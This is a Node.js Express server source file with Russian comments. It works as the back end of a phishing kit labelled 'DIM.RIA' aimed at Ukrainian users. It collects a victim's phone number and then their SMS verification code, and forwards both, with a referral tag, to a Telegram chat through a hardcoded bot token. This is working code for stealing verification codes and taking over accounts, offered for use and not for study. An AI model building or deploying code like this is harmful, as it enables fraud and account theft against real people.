const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// === TELEGRAM КОНФИГ ===
const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

app.use(bodyParser.json());
app.use(express.static(__dirname));

// === ГЛАВНАЯ + ПАНЕЛЬ ===
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

// === УЛУЧШЕННАЯ ОТПРАВКА В TELEGRAM ===
async function sendToTelegram(message) {
    const payload = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };

    for (let i = 0; i < 3; i++) {
        try {
            const response = await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                timeout: 10000
            });

            const result = await response.json();

            if (response.ok && result.ok) {
                console.log('УСПЕШНО отправлено в Telegram');
                return true;
            } else {
                console.error(`Ошибка Telegram API:`, result);
                if (result.error_code === 403) {
                    console.error('Бот заблокирован или нет доступа к чату!');
                    return false;
                }
            }
        } catch (err) {
            console.error(`Попытка ${i + 1} не удалась:`, err.message);
            if (i === 2) return false;
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    return false;
}

// === ОБРАБОТКА ДАННЫХ ===
app.post('/api/send-data', async (req, res) => {
    console.log('Получен запрос:', req.body); // ← ВИДИМ, ЧТО ПРИХОДИТ

    const { step, phone, code, referrer } = req.body;

    let message = '';

    if (step === 'phone' && phone) {
        message = `*ПРОЕКТ:* DIM.RIA ⚡\n*Номер:* \`${phone}\`\n*СТРАНА:* Україна`;
        if (referrer) message += `\n*Реферал:* @${referrer}`;
    } 
    else if (step === 'code' && code) {
        message = `*SMS КОД:* \`${code}\``;
        if (referrer) message += `\n*Реферал:* @${referrer}`;
    } 
    else {
        return res.status(400).json({ success: false, error: 'Invalid data' });
    }

    const success = await sendToTelegram(message);

    if (success) {
        console.log('Данные успешно отправлены в Telegram');
        res.json({ success: true });
    } else {
        console.error('КРИТИЧЕСКАЯ ОШИБКА: Не удалось отправить в Telegram');
        res.status(500).json({ success: false, error: 'Telegram error' });
    }
});

// === ЗАПУСК ===
app.listen(PORT, () => {
    console.log(`Сервер запущен: http://localhost:${PORT}`);
    console.log(`Панель: http://localhost:${PORT}/panel`);
    
    // === ТЕСТОВАЯ ОТПРАВКА ПРИ СТАРТЕ ===
    setTimeout(() => {
        sendToTelegram(`*СЕРВЕР ЗАПУЩЕН* ✅\nВремя: ${new Date().toLocaleString('uk-UA')}`);
    }, 3000);
});
